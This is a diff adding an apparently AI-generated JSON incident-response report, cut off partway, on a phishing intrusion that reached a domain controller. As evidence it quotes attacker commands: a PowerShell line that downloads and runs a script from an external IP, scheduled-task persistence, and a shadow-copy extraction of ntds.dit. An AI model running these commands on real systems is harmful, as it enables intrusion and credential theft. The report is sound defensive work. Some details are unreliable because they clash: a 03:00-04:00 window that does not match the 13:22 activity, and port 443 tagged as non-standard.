@@ -1,0 +1,2548 @@
+{
+  "schema_version": "1.0.0",
+  "meta": {
+    "report_id": "b6f6b6d2-6b0e-4e63-9a63-9a2a6a9e6a41",
+    "generated_utc": "2026-04-18T02:14:07.0000000Z",
+    "engagement": {
+      "case_id": "ACME-2026-014",
+      "examiner": "Jordan Alvarez",
+      "organization": "Acme Robotics, Inc.",
+      "classification": "TLP:AMBER // CLIENT CONFIDENTIAL",
+      "description": "Suspected credential-theft intrusion originating from a phishing email, spanning a workstation and the primary domain controller."
+    },
+    "model": {
+      "provider": "anthropic",
+      "model_id": "claude-opus-5-5",
+      "prompt_version": "irtriage-report-v3",
+      "temperature": 0.2,
+      "passes": 2
+    },
+    "usage": {
+      "input_tokens": 812400,
+      "output_tokens": 9800,
+      "cached_input_tokens": 640000,
+      "estimated_cost_usd": 4.87,
+      "wall_clock_seconds": 143.2
+    }
+  },
+  "scope": {
+    "hosts": [
+      {
+        "host": "WIN-WKS07",
+        "host_id": "S-1-5-21-WKS07",
+        "row_count": 30210,
+        "os": "Windows 11 23H2",
+        "first_event_utc": "2026-04-10T00:00:03.0000000Z",
+        "last_event_utc": "2026-04-18T01:58:00.0000000Z"
+      },
+      {
+        "host": "WIN-DC01",
+        "host_id": "S-1-5-21-DC01",
+        "row_count": 18000,
+        "os": "Windows Server 2022",
+        "first_event_utc": "2026-04-10T00:00:11.0000000Z",
+        "last_event_utc": "2026-04-18T01:59:40.0000000Z"
+      }
+    ],
+    "row_count": 48210,
+    "rows_analysed": 12500,
+    "reduction_ratio": 0.2592,
+    "time_range": {
+      "start_utc": "2026-04-10T00:00:00.0000000Z",
+      "end_utc": "2026-04-18T02:00:00.0000000Z"
+    },
+    "sources": {
+      "wineventlog": 30500,
+      "filesystem": 8200,
+      "registry": 4100,
+      "prefetch": 1900,
+      "network": 3510
+    },
+    "artifacts": {
+      "Windows.EventLogs.Security": 14200,
+      "Windows.EventLogs.Sysmon": 12100,
+      "Generic.Collectors.File": 8200,
+      "Windows.Registry.NTUser": 4100,
+      "Windows.Network.NetstatEnriched": 3510,
+      "Windows.Forensics.Prefetch": 1900,
+      "Windows.EventLogs.PowerShell": 4200
+    },
+    "input_files": [
+      {
+        "name": "WIN-WKS07_triage.zip",
+        "sha256": "34bee669acb7201cec0cbabb061b311147e1193dcace2ba96bd51c28bb0bfd0d",
+        "rows": 30210,
+        "clock_skew_seconds": 0
+      },
+      {
+        "name": "WIN-DC01_triage.zip",
+        "sha256": "091f66efb31e2846b73816391ee4b8be871f5df45bbb8e85b00125e814d4a83e",
+        "rows": 18000,
+        "clock_skew_seconds": 2
+      }
+    ]
+  },
+  "verdict": {
+    "assessment": "likely_compromised",
+    "confidence": "moderate",
+    "confidence_rationale": "The initial-access-through-C2 chain is well cited across both hosts with corroborating detections. Confidence is capped at \"moderate\" rather than \"high\" because the token-budget reduction (25.9% of rows analysed) means undiscovered lateral movement to a third host cannot be ruled out, and F-007 could not be independently verified this pass.",
+    "rationale": "A phishing-delivered LNK led to PowerShell execution, local persistence, credential access on the workstation, lateral movement to the domain controller using the same credential, and an NTDS.dit extraction consistent with a domain-wide credential compromise. C2 beaconing and staged data collection were both observed.",
+    "earliest_suspicious_activity_utc": "2026-04-17T13:02:11.0000000Z",
+    "attack_stage": "exfiltration (staged, not yet confirmed transferred off-host)"
+  },
+  "executive_summary": {
+    "text": "Between 2026-04-17 13:02 UTC and 18:35 UTC, an intrusion progressed from a phishing email on workstation WIN-WKS07 to a credential-access event on the primary domain controller WIN-DC01. The attacker used a malicious shortcut (LNK) file to launch PowerShell, which disabled Windows Defender, established scheduled-task persistence, and later accessed the LSASS process in a manner consistent with credential dumping.\n\nNine minutes after the suspected credential theft, the same user account authenticated to the domain controller from an unfamiliar source, created a volume shadow copy, and copied out the Active Directory database (NTDS.dit) - the file that contains a hash of every domain account's password. Outbound network connections to a single external IP address continued on a regular five-minute beacon for over four hours, and a large archive of engineering documents was staged for possible removal shortly before that beaconing began.\n\nWhat is known: the technical chain from phishing email to domain-controller credential-database access is well supported by cited log evidence on both hosts, corroborated by three independent detection engines (Sigma, YARA, Suricata).\n\nWhat is not known: whether the staged archive left the network, whether any other hosts were reached via the same stolen credential, and whether the scheduled-task activity flagged on the domain controller (F-007) is related - the evidence pack for this analysis pass did not include full-fidelity logs for that host/time window.\n\nWhat to do now: treat every domain credential as potentially compromised, isolate the domain controller for imaging, and begin a phased, forest-wide credential reset. The Recommendations section lists specific, prioritized actions.",
+    "bullets": [
+      "Phishing email -> malicious LNK -> PowerShell -> persistence, on WIN-WKS07 at 13:02 UTC.",
+      "Suspected LSASS credential access at 13:07 UTC, followed by lateral movement to the domain controller at 13:16 UTC using the same account.",
+      "NTDS.dit (the domain credential database) was extracted from a volume shadow copy on the domain controller at 13:22 UTC.",
+      "Outbound beaconing to 185.220.101.42 continued for over 4 hours; a 1.4GB archive of engineering documents was staged beforehand.",
+      "Analysis covered 25.9% of the 48,210 collected rows due to token-budget reduction - undiscovered activity on a third host cannot be ruled out.",
+      "One finding (F-007, a scheduled task on the domain controller) could not be independently cited this pass and needs a follow-up run."
+    ]
+  },
+  "findings": [
+    {
+      "id": "F-001",
+      "title": "Phishing email delivered malicious LNK attachment to WIN-WKS07",
+      "severity": "high",
+      "confidence": "high",
+      "category": "initial_access",
+      "narrative": "A spear-phishing email with subject \"Invoice_0417.pdf.lnk\" was opened by user jsmith on WIN-WKS07 at 2026-04-17T13:02:11Z. The LNK spawned powershell.exe with an encoded command that downloaded a second-stage payload.",
+      "evidence": [
+        {
+          "row_hash": "fb5a0ed080d151531f6f775e368f722d3c4248b934016a51096e6e5a195aab0c",
+          "timestamp_utc": "2026-04-17T13:02:11.0000000Z",
+          "host": "WIN-WKS07",
+          "excerpt": "Outlook.exe wrote Invoice_0417.pdf.lnk to Downloads\\",
+          "why_relevant": "Delivery mechanism for the initial LNK."
+        },
+        {
+          "row_hash": "4631740caf7abc57eeafbe1aa4f4973555a217e02e855590ec3bf7d18a8d3ad8",
+          "timestamp_utc": "2026-04-17T13:02:19.0000000Z",
+          "host": "WIN-WKS07",
+          "excerpt": "explorer.exe -> powershell.exe -enc JABzAD0A...",
+          "why_relevant": "LNK execution spawning obfuscated PowerShell."
+        }
+      ],
+      "mitre_techniques": [
+        "T1566.001",
+        "T1059.001"
+      ],
+      "affected_hosts": [
+        "WIN-WKS07"
+      ],
+      "affected_accounts": [
+        "ACME\\jsmith"
+      ],
+      "first_seen_utc": "2026-04-17T13:02:11.0000000Z",
+      "last_seen_utc": "2026-04-17T13:02:19.0000000Z",
+      "recommendation": "Reset jsmith credentials, block the sender domain, and hunt for the same LNK hash across the fleet.",
+      "detection_rules": [
+        {
+          "engine": "sigma",
+          "rule_id": "SIG-1023",
+          "rule_name": "Suspicious LNK spawning PowerShell",
+          "severity": "high"
+        }
+      ],
+      "false_positive_considered": "IT-issued LNK shortcuts to internal shares are common; ruled out because this LNK resolved to a Downloads-folder path with an encoded PowerShell command line, which internal shortcuts never carry."
+    },
+    {
+      "id": "F-002",
+      "title": "Encoded PowerShell downloader retrieved second-stage payload",
+      "severity": "high",
+      "confidence": "high",
+      "category": "execution",
+      "narrative": "The PowerShell process from F-001 decoded to a one-liner that downloaded update.ps1 from 185.220.101.42 and executed it in memory via IEX.",
+      "evidence": [
+        {
+          "row_hash": "c14cbf8fe224d87b1b537b2dcfe09a007665f29570836f717370e35acb2d13d1",
+          "timestamp_utc": "2026-04-17T13:02:21.0000000Z",
+          "host": "WIN-WKS07",
+          "excerpt": "powershell.exe -> IEX(New-Object Net.WebClient).DownloadString(\"hxxp://185.220.101[.]42/update.ps1\")",
+          "why_relevant": "Second-stage download and in-memory execution."
+        }
+      ],
+      "mitre_techniques": [
+        "T1059.001",
+        "T1105"
+      ],
+      "affected_hosts": [
+        "WIN-WKS07"
+      ],
+      "first_seen_utc": "2026-04-17T13:02:21.0000000Z",
+      "last_seen_utc": "2026-04-17T13:02:22.0000000Z",
+      "recommendation": "Block 185.220.101.42 at the perimeter; retrieve and analyse update.ps1 if cached anywhere.",
+      "detection_rules": [
+        {
+          "engine": "yara",
+          "rule_id": "YAR-0091",
+          "rule_name": "PS_Downloader_InMemory",
+          "severity": "high"
+        }
+      ]
+    },
+    {
+      "id": "F-003",
+      "title": "Scheduled task created for persistence (SvcHostMgr)",
+      "severity": "medium",
+      "confidence": "high",
+      "category": "persistence",
+      "narrative": "A scheduled task named \"SvcHostMgr\" was registered to run a payload from %APPDATA%\\svchostmgr.exe every 30 minutes, surviving reboot.",
+      "evidence": [
+        {
+          "row_hash": "08ba7ba61cda5f337cfdb03169321eb17d739eb80cfbcc54b8184e673a1f271e",
+          "timestamp_utc": "2026-04-17T13:05:40.0000000Z",
+          "host": "WIN-WKS07",
+          "excerpt": "schtasks /create /tn SvcHostMgr /tr %APPDATA%\\svchostmgr.exe /sc minute /mo 30",
+          "why_relevant": "Persistence mechanism creation."
+        }
+      ],
+      "mitre_techniques": [
+        "T1053.005"
+      ],
+      "affected_hosts": [
+        "WIN-WKS07"
+      ],
+      "first_seen_utc": "2026-04-17T13:05:40.0000000Z",
+      "last_seen_utc": "2026-04-17T13:05:40.0000000Z",
+      "recommendation": "Delete the SvcHostMgr task and quarantine svchostmgr.exe; hunt for the same task name fleet-wide.",
+      "detection_rules": [
+        {
+          "engine": "sigma",
+          "rule_id": "SIG-2044",
+          "rule_name": "Suspicious schtasks creation under AppData",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "id": "F-004",
+      "title": "LSASS memory access consistent with credential dumping",
+      "severity": "critical",
+      "confidence": "moderate",
+      "category": "credential_access",
+      "narrative": "svchostmgr.exe opened a handle to lsass.exe with PROCESS_VM_READ shortly after persistence was established, consistent with an in-memory credential dumper (e.g. Mimikatz-style sekurlsa). No dump file was recovered from disk, so it is not confirmed the dump succeeded.",
+      "evidence": [
+        {
+          "row_hash": "9a03f61e091f4e2976b8f3060be3d23c8f4ba58db5e2f8c06f8e250d7d93726b",
+          "timestamp_utc": "2026-04-17T13:07:02.0000000Z",
+          "host": "WIN-WKS07",
+          "excerpt": "svchostmgr.exe opened lsass.exe (PID 812) with access 0x1010",
+          "why_relevant": "Access pattern matches credential-dumping tooling."
+        }
+      ],
+      "mitre_techniques": [
+        "T1003.001"
+      ],
+      "affected_hosts": [
+        "WIN-WKS07"
+      ],
+      "affected_accounts": [
+        "ACME\\jsmith"
+      ],
+      "first_seen_utc": "2026-04-17T13:07:02.0000000Z",
+      "last_seen_utc": "2026-04-17T13:07:02.0000000Z",
+      "recommendation": "Treat all credentials cached on WIN-WKS07 at the time of compromise as compromised; force domain-wide password reset for jsmith and any account that logged on to this host in the prior 30 days.",
+      "detection_rules": [
+        {
+          "engine": "sigma",
+          "rule_id": "SIG-3011",
+          "rule_name": "Suspicious LSASS access",
+          "severity": "critical"
+        }
+      ],
+      "false_positive_considered": "EDR/AV agents legitimately open LSASS with similar access rights; ruled less likely (not fully excluded) because svchostmgr.exe is not a recognised security product and was itself dropped by the persistence mechanism in F-003."
+    },
+    {
+      "id": "F-005",
+      "title": "Lateral movement to WIN-DC01 via stolen jsmith credentials",
+      "severity": "critical",
+      "confidence": "moderate",
+      "category": "lateral_movement",
+      "narrative": "An interactive logon for ACME\\jsmith was observed on the domain controller WIN-DC01 nine minutes after the suspected credential access on WIN-WKS07, from a source IP not previously associated with this user.",
+      "evidence": [
+        {
+          "row_hash": "2b75578bcfac7bb97cb98b17ad207976f04c720b2f55984420c1eb1b4aab7d6d",
+          "timestamp_utc": "2026-04-17T13:16:30.0000000Z",
+          "host": "WIN-DC01",
+          "excerpt": "EventID 4624 LogonType 3, Account ACME\\jsmith, SourceIP 10.20.4.77",
+          "why_relevant": "Network logon on the DC using the credential believed stolen in F-004."
+        }
+      ],
+      "mitre_techniques": [
+        "T1021.002",
+        "T1078"
+      ],
+      "affected_hosts": [
+        "WIN-WKS07",
+        "WIN-DC01"
+      ],
+      "affected_accounts": [
+        "ACME\\jsmith"
+      ],
+      "first_seen_utc": "2026-04-17T13:16:30.0000000Z",
+      "last_seen_utc": "2026-04-17T13:16:30.0000000Z",
+      "recommendation": "Isolate WIN-DC01 for forensic imaging; audit all jsmith authentications domain-wide for the past 90 days.",
+      "detection_rules": [
+        {
+          "engine": "sigma",
+          "rule_id": "SIG-4400",
+          "rule_name": "Anomalous logon source for privileged-adjacent account",
+          "severity": "high"
+        }
+      ]
+    },
+    {
+      "id": "F-006",
+      "title": "Directory Services database (NTDS.dit) accessed via volume shadow copy",
+      "severity": "critical",
+      "confidence": "moderate",
+      "category": "credential_access",
+      "narrative": "A VSSAdmin shadow copy was created on WIN-DC01 and ntds.dit was copied out of it, a common technique for offline extraction of every domain credential hash.",
+      "evidence": [
+        {
+          "row_hash": "230f5129c081699c8d3af34a2db6160b957a2bb4dac305258ea1d3f54a95f988",
+          "timestamp_utc": "2026-04-17T13:22:05.0000000Z",
+          "host": "WIN-DC01",
+          "excerpt": "vssadmin create shadow /for=C:",
+          "why_relevant": "Shadow copy creation immediately preceding the ntds.dit access."
+        },
+        {
+          "row_hash": "5f1e08dcc96b95283e28f24fa5903175fe8061a8afef9d85f09c62031b3fc860",
+          "timestamp_utc": "2026-04-17T13:22:48.0000000Z",
+          "host": "WIN-DC01",
+          "excerpt": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy12\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\n.dit",
+          "why_relevant": "Direct copy of the domain credential database from the shadow copy."
+        }
+      ],
+      "mitre_techniques": [
+        "T1003.003"
+      ],
+      "affected_hosts": [
+        "WIN-DC01"
+      ],
+      "first_seen_utc": "2026-04-17T13:22:05.0000000Z",
+      "last_seen_utc": "2026-04-17T13:22:48.0000000Z",
+      "recommendation": "Assume full domain credential compromise. Begin a forest-wide krbtgt reset (twice) and a phased password reset.",
+      "detection_rules": [
+        {
+          "engine": "sigma",
+          "rule_id": "SIG-4477",
+          "rule_name": "NTDS.dit access via VSS",
+          "severity": "critical"
+        }
+      ]
+    },
+    {
+      "id": "F-007",
+      "title": "Suspicious scheduled task observed on WIN-DC01 (unconfirmed)",
+      "severity": "medium",
+      "confidence": "low",
+      "category": "persistence",
+      "narrative": "The client detection engine flagged a scheduled task rename event on WIN-DC01 around the time of the NTDS.dit access. The evidence pack sent to the model for this pass did not include the underlying SuperTimeline rows for this host/time window (they fell outside the token budget), so this finding is carried forward from the detection summary only and could not be independently cited against raw rows this pass.",
+      "evidence": [],
+      "mitre_techniques": [
+        "T1053.005"
+      ],
+      "affected_hosts": [
+        "WIN-DC01"
+      ],
+      "recommendation": "Re-run analysis with WIN-DC01 03:00-04:00 UTC evidence included at full fidelity before acting on this finding.",
+      "false_positive_considered": "Could be unrelated scheduled maintenance; cannot be ruled out without the underlying rows."
+    },
+    {
+      "id": "F-008",
+      "title": "Outbound connections to known C2 infrastructure",
+      "severity": "high",
+      "confidence": "high",
+      "category": "command_and_control",
+      "narrative": "WIN-WKS07 made repeated HTTPS connections to 185.220.101.42 on port 443 at a regular 5-minute beacon interval, consistent with a C2 check-in.",
+      "evidence": [
+        {
+          "row_hash": "c7ecacc7f264e7df56fadff6856dc31b2832b048a7310dc7bef361301422eb78",
+          "timestamp_utc": "2026-04-17T14:00:00.0000000Z",
+          "host": "WIN-WKS07",
+          "excerpt": "svchostmgr.exe -> TCP 185.220.101.42:443, 512 bytes sent",
+          "why_relevant": "Regular beacon interval matching C2 check-in behaviour."
+        },
+        {
+          "row_hash": "346259bbdbb42df1ff98b0c7090cfeea387c059387fc905d913599c0488299b7",
+          "timestamp_utc": "2026-04-17T14:05:00.0000000Z",
+          "host": "WIN-WKS07",
+          "excerpt": "svchostmgr.exe -> TCP 185.220.101.42:443, 498 bytes sent",
+          "why_relevant": "Second beacon, 5 minutes after the first."
+        }
+      ],
+      "mitre_techniques": [
+        "T1071.001",
+        "T1571"
+      ],
+      "affected_hosts": [
+        "WIN-WKS07"
+      ],
+      "first_seen_utc": "2026-04-17T14:00:00.0000000Z",
+      "last_seen_utc": "2026-04-17T18:35:00.0000000Z",
+      "recommendation": "Block the C2 IP network-wide; retain full packet captures if available for protocol analysis.",
+      "detection_rules": [
+        {
+          "engine": "suricata",
+          "rule_id": "ET-2029981",
+          "rule_name": "ET MALWARE Beaconing Behavior",
+          "severity": "high"
+        }
+      ]
+    },
+    {
+      "id": "F-009",
+      "title": "Staged archive of sensitive engineering documents",
+      "severity": "high",
+      "confidence": "moderate",
+      "category": "collection",
+      "narrative": "A 1.4GB archive \"eng_specs.7z\" was created under C:\\Users\\jsmith\\AppData\\Local\\Temp from files in \\\\FS01\\Engineering\\Specs, then moved to the Downloads folder shortly before the observed C2 beaconing began.",
+      "evidence": [
+        {
+          "row_hash": "1f24c882e7e5221b4258778e693525eef0a1eb9c3beccfc78bb6cbf2af4c6eae",
+          "timestamp_utc": "2026-04-17T13:45:12.0000000Z",
+          "host": "WIN-WKS07",
+          "excerpt": "7z.exe a eng_specs.7z \\\\FS01\\Engineering\\Specs\\*",
+          "why_relevant": "Bulk archival of a sensitive network share."
+        }
+      ],
+      "mitre_techniques": [
+        "T1560.001",
+        "T1213"
+      ],
+      "affected_hosts": [
+        "WIN-WKS07"
+      ],
+      "affected_accounts": [
+        "ACME\\jsmith"
+      ],
+      "first_seen_utc": "2026-04-17T13:45:12.0000000Z",
+      "last_seen_utc": "2026-04-17T13:46:01.0000000Z",
+      "recommendation": "Notify Engineering leadership of potential IP exposure; determine exact file list inside the archive from \\\\FS01 access logs."
+    },
+    {
+      "id": "F-010",
+      "title": "Windows Defender real-time protection disabled via registry",
+      "severity": "medium",
+      "confidence": "high",
+      "category": "defense_evasion",
+      "narrative": "The registry value DisableRealtimeMonitoring was set to 1 under the Defender policy key on WIN-WKS07, seven minutes before the second-stage payload was downloaded.",
+      "evidence": [
+        {
+          "row_hash": "48fe3683f75c2a6c97e8e6c4ad90deadb8a74bf3a101442c46f307299ec5ce1d",
+          "timestamp_utc": "2026-04-17T12:55:30.0000000Z",
+          "host": "WIN-WKS07",
+          "excerpt": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableRealtimeMonitoring = 1",
+          "why_relevant": "Defense evasion immediately preceding payload download."
+        }
+      ],
+      "mitre_techniques": [
+        "T1562.001"
+      ],
+      "affected_hosts": [
+        "WIN-WKS07"
+      ],
+      "first_seen_utc": "2026-04-17T12:55:30.0000000Z",
+      "last_seen_utc": "2026-04-17T12:55:30.0000000Z",
+      "recommendation": "Re-enable real-time protection fleet-wide and alert on future changes to this key.",
+      "detection_rules": [
+        {
+          "engine": "sigma",
+          "rule_id": "SIG-0512",
+          "rule_name": "Defender real-time protection disabled",
+          "severity": "medium"
+        }
+      ]
+    },
+    {
+      "id": "F-011",
+      "title": "Local administrator group membership modified for jsmith",
+      "severity": "low",
+      "confidence": "moderate",
+      "category": "privilege_escalation",
+      "narrative": "The local Administrators group on WIN-WKS07 gained ACME\\jsmith as a member, a low-friction privilege escalation on a workstation already fully compromised.",
+      "evidence": [
+        {
+          "row_hash": "b92e9ded42fc51a44a0bd9b216d95a982182682aa19e387ed732b462d79c78f4",
+          "timestamp_utc": "2026-04-17T13:03:40.0000000Z",
+          "host": "WIN-WKS07",
+          "excerpt": "net localgroup administrators jsmith /add",
+          "why_relevant": "Local privilege escalation."
+        }
+      ],
+      "mitre_techniques": [
+        "T1098"
+      ],
+      "affected_hosts": [
+        "WIN-WKS07"
+      ],
+      "affected_accounts": [
+        "ACME\\jsmith"
+      ],
+      "first_seen_utc": "2026-04-17T13:03:40.0000000Z",
+      "last_seen_utc": "2026-04-17T13:03:40.0000000Z",
+      "recommendation": "Remove jsmith from the local Administrators group once the host is rebuilt."
+    },
+    {
+      "id": "F-012",
+      "title": "Legacy unused service account with non-expiring password (hygiene)",
+      "severity": "informational",
+      "confidence": "high",
+      "category": "hygiene",
+      "narrative": "svc-backup-legacy has a password set to never expire and has not authenticated in 191 days. Not implicated in this intrusion, but it is exactly the kind of standing credential this intrusion sought to abuse - worth remediating regardless of this incident.",
+      "evidence": [
+        {
+          "row_hash": "09c0943eb29d1d326cb51119a8a516130bfcc08323a6e0e7c9aaf8a0b5428747",
+          "timestamp_utc": "2026-04-10T09:00:00.0000000Z",
+          "host": "WIN-DC01",
+          "excerpt": "ADSI query: svc-backup-legacy PasswordNeverExpires=TRUE LastLogon=191 days ago",
+          "why_relevant": "Standing-credential hygiene issue independent of this intrusion."
+        }
+      ],
+      "mitre_techniques": [],
+      "affected_accounts": [
+        "ACME\\svc-backup-legacy"
+      ],
+      "recommendation": "Disable or rotate svc-backup-legacy; enforce password expiry policy for service accounts."
+    }
+  ],
+  "attack_narrative": {
+    "summary": "A single-account intrusion chain from initial phishing access on a workstation through to domain-controller credential-database extraction, with ongoing C2 beaconing and staged data collection.",
+    "phases": [
+      {
+        "order": 1,
+        "name": "Initial Access & Execution",
+        "start_utc": "2026-04-17T13:02:11.0000000Z",
+        "end_utc": "2026-04-17T13:02:22.0000000Z",
+        "description": "Phishing LNK opened, spawning obfuscated PowerShell that downloaded and executed a second-stage payload.",
+        "mitre_tactic": "initial-access",
+        "finding_ids": [
+          "F-001",
+          "F-002"
+        ]
+      },
+      {
+        "order": 2,
+        "name": "Defense Evasion & Persistence",
+        "start_utc": "2026-04-17T12:55:30.0000000Z",
+        "end_utc": "2026-04-17T13:05:40.0000000Z",
+        "description": "Windows Defender real-time protection disabled; scheduled task installed for persistence; local admin group modified.",
+        "mitre_tactic": "defense-evasion",
+        "finding_ids": [
+          "F-010",
+          "F-003",
+          "F-011"
+        ]
+      },
+      {
+        "order": 3,
+        "name": "Credential Access",
+        "start_utc": "2026-04-17T13:07:02.0000000Z",
+        "end_utc": "2026-04-17T13:22:48.0000000Z",
+        "description": "LSASS memory access on the workstation, followed by NTDS.dit extraction on the domain controller.",
+        "mitre_tactic": "credential-access",
+        "finding_ids": [
+          "F-004",
+          "F-006"
+        ]
+      },
+      {
+        "order": 4,
+        "name": "Lateral Movement",
+        "start_utc": "2026-04-17T13:16:30.0000000Z",
+        "end_utc": "2026-04-17T13:16:30.0000000Z",
+        "description": "Interactive logon to the domain controller using the credential believed stolen from the workstation.",
+        "mitre_tactic": "lateral-movement",
+        "finding_ids": [
+          "F-005"
+        ]
+      },
+      {
+        "order": 5,
+        "name": "Collection & Command and Control",
+        "start_utc": "2026-04-17T13:45:12.0000000Z",
+        "end_utc": "2026-04-17T18:35:00.0000000Z",
+        "description": "Engineering documents archived; regular C2 beaconing to external infrastructure over several hours.",
+        "mitre_tactic": "command-and-control",
+        "finding_ids": [
+          "F-008",
+          "F-009"
+        ]
+      }
+    ]
+  },
+  "iocs": {
+    "files": [
+      {
+        "value": "Invoice_0417.pdf.lnk",
+        "context": "Phishing attachment, Downloads folder",
+        "occurrences": 1,
+        "confidence": "high",
+        "verdict": "malicious",
+        "finding_ids": [
+          "F-001"
+        ],
+        "first_seen_utc": "2026-04-17T13:02:11.0000000Z"
+      },
+      {
+        "value": "svchostmgr.exe",
+        "context": "Second-stage payload / persistence binary in %APPDATA%",
+        "occurrences": 4,
+        "confidence": "high",
+        "verdict": "malicious",
+        "finding_ids": [
+          "F-002",
+          "F-003",
+          "F-004",
+          "F-008"
+        ]
+      },
+      {
+        "value": "eng_specs.7z",
+        "context": "Staged archive of \\\\FS01\\Engineering\\Specs",
+        "occurrences": 1,
+        "confidence": "moderate",
+        "verdict": "suspicious",
+        "finding_ids": [
+          "F-009"
+        ]
+      },
+      {
+        "value": "n.dit",
+        "context": "Copy of ntds.dit staged in C:\\Windows\\Temp",
+        "occurrences": 1,
+        "confidence": "high",
+        "verdict": "malicious",
+        "finding_ids": [
+          "F-006"
+        ]
+      }
+    ],
+    "hashes": [
+      {
+        "value": "3fb90d43677fc9b2907f2a45da7f9dd7e2a333796e9a3022a7845ac17789acc5",
+        "context": "SHA-256 of svchostmgr.exe",
+        "occurrences": 1,
+        "confidence": "high",
+        "verdict": "malicious",
+        "finding_ids": [
+          "F-002"
+        ]
+      },
+      {
+        "value": "ed2d7ea4ac135fcc1b9905f506ffcfbab1d27ca465ef8182145329e1712c4b6e",
+        "context": "SHA-256 of Invoice_0417.pdf.lnk",
+        "occurrences": 1,
+        "confidence": "high",
+        "verdict": "malicious",
+        "finding_ids": [
+          "F-001"
+        ]
+      }
+    ],
+    "ip_addresses": [
+      {
+        "value": "185.220.101.42",
+        "context": "C2 / second-stage download host",
+        "occurrences": 58,
+        "confidence": "high",
+        "verdict": "malicious",
+        "finding_ids": [
+          "F-002",
+          "F-008"
+        ],
+        "first_seen_utc": "2026-04-17T13:02:21.0000000Z",
+        "last_seen_utc": "2026-04-17T18:35:00.0000000Z"
+      },
+      {
+        "value": "10.20.4.77",
+        "context": "Internal source of anomalous DC logon",
+        "occurrences": 1,
+        "confidence": "moderate",
+        "verdict": "suspicious",
+        "finding_ids": [
+          "F-005"
+        ]
+      }
+    ],
+    "domains": [
+      {
+        "value": "acme-invoice-portal.example",
+        "context": "Phishing sender infrastructure domain",
+        "occurrences": 1,
+        "confidence": "moderate",
+        "verdict": "suspicious",
+        "finding_ids": [
+          "F-001"
+        ]
+      }
+    ],
+    "urls": [
+      {
+        "value": "hxxp://185.220.101[.]42/update.ps1",
+        "context": "Second-stage PowerShell payload URL",
+        "occurrences": 1,
+        "confidence": "high",
+        "verdict": "malicious",
+        "finding_ids": [
+          "F-002"
+        ]
+      }
+    ],
+    "registry_keys": [
+      {
+        "value": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableRealtimeMonitoring",
+        "context": "Defender real-time protection disabled",
+        "occurrences": 1,
+        "confidence": "high",
+        "verdict": "malicious",
+        "finding_ids": [
+          "F-010"
+        ]
+      }
+    ],
+    "accounts": [
+      {
+        "value": "ACME\\jsmith",
+        "context": "Compromised user account, used for lateral movement",
+        "occurrences": 6,
+        "confidence": "high",
+        "verdict": "suspicious",
+        "finding_ids": [
+          "F-001",
+          "F-004",
+          "F-005",
+          "F-009",
+          "F-011"
+        ]
+      },
+      {
+        "value": "ACME\\svc-backup-legacy",
+        "context": "Unrelated hygiene finding, not implicated in this intrusion",
+        "occurrences": 1,
+        "confidence": "high",
+        "verdict": "unknown",
+        "finding_ids": [
+          "F-012"
+        ]
+      }
+    ],
+    "processes": [
+      {
+        "value": "svchostmgr.exe",
+        "context": "Persistence + credential-access + C2 process",
+        "occurrences": 12,
+        "confidence": "high",
+        "verdict": "malicious",
+        "finding_ids": [
+          "F-003",
+          "F-004",
+          "F-008"
+        ]
+      },
+      {
+        "value": "powershell.exe",
+        "context": "Obfuscated downloader stage",
+        "occurrences": 3,
+        "confidence": "high",
+        "verdict": "malicious",
+        "finding_ids": [
+          "F-002"
+        ]
+      }
+    ],
+    "scheduled_tasks": [
+      {
+        "value": "SvcHostMgr",
+        "context": "Persistence task on WIN-WKS07",
+        "occurrences": 1,
+        "confidence": "high",
+        "verdict": "malicious",
+        "finding_ids": [
+          "F-003"
+        ]
+      }
+    ],
+    "services": []
+  },
+  "mitre_coverage": [
+    {
+      "technique_id": "T1566.001",
+      "technique_name": "Spearphishing Attachment",
+      "tactic": "initial-access",
+      "event_count": 2,
+      "finding_ids": [
+        "F-001"
+      ],
+      "max_severity": "high"
+    },
+    {
+      "technique_id": "T1059.001",
+      "technique_name": "PowerShell",
+      "tactic": "execution",
+      "event_count": 5,
+      "finding_ids": [
+        "F-001",
+        "F-002"
+      ],
+      "max_severity": "high"
+    },
+    {
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "event_count": 3,
+      "finding_ids": [
+        "F-002"
+      ],
+      "max_severity": "high"
+    },
+    {
+      "technique_id": "T1053.005",
+      "technique_name": "Scheduled Task",
+      "tactic": "persistence",
+      "event_count": 2,
+      "finding_ids": [
+        "F-003",
+        "F-007"
+      ],
+      "max_severity": "medium"
+    },
+    {
+      "technique_id": "T1003.001",
+      "technique_name": "LSASS Memory",
+      "tactic": "credential-access",
+      "event_count": 1,
+      "finding_ids": [
+        "F-004"
+      ],
+      "max_severity": "critical"
+    },
+    {
+      "technique_id": "T1003.003",
+      "technique_name": "NTDS",
+      "tactic": "credential-access",
+      "event_count": 2,
+      "finding_ids": [
+        "F-006"
+      ],
+      "max_severity": "critical"
+    },
+    {
+      "technique_id": "T1021.002",
+      "technique_name": "SMB/Windows Admin Shares",
+      "tactic": "lateral-movement",
+      "event_count": 1,
+      "finding_ids": [
+        "F-005"
+      ],
+      "max_severity": "critical"
+    },
+    {
+      "technique_id": "T1078",
+      "technique_name": "Valid Accounts",
+      "tactic": "lateral-movement",
+      "event_count": 1,
+      "finding_ids": [
+        "F-005"
+      ],
+      "max_severity": "critical"
+    },
+    {
+      "technique_id": "T1071.001",
+      "technique_name": "Web Protocols",
+      "tactic": "command-and-control",
+      "event_count": 58,
+      "finding_ids": [
+        "F-008"
+      ],
+      "max_severity": "high"
+    },
+    {
+      "technique_id": "T1571",
+      "technique_name": "Non-Standard Port",
+      "tactic": "command-and-control",
+      "event_count": 58,
+      "finding_ids": [
+        "F-008"
+      ],
+      "max_severity": "high"
+    },
+    {
+      "technique_id": "T1560.001",
+      "technique_name": "Archive via Utility",
+      "tactic": "collection",
+      "event_count": 1,
+      "finding_ids": [
+        "F-009"
+      ],
+      "max_severity": "high"
+    },
+    {
+      "technique_id": "T1562.001",
+      "technique_name": "Disable or Modify Tools",
+      "tactic": "defense-evasion",
+      "event_count": 1,
+      "finding_ids": [
+        "F-010"
+      ],
+      "max_severity": "medium"
+    },
+    {
+      "technique_id": "T1098",
+      "technique_name": "Account Manipulation",
+      "tactic": "privilege-escalation",
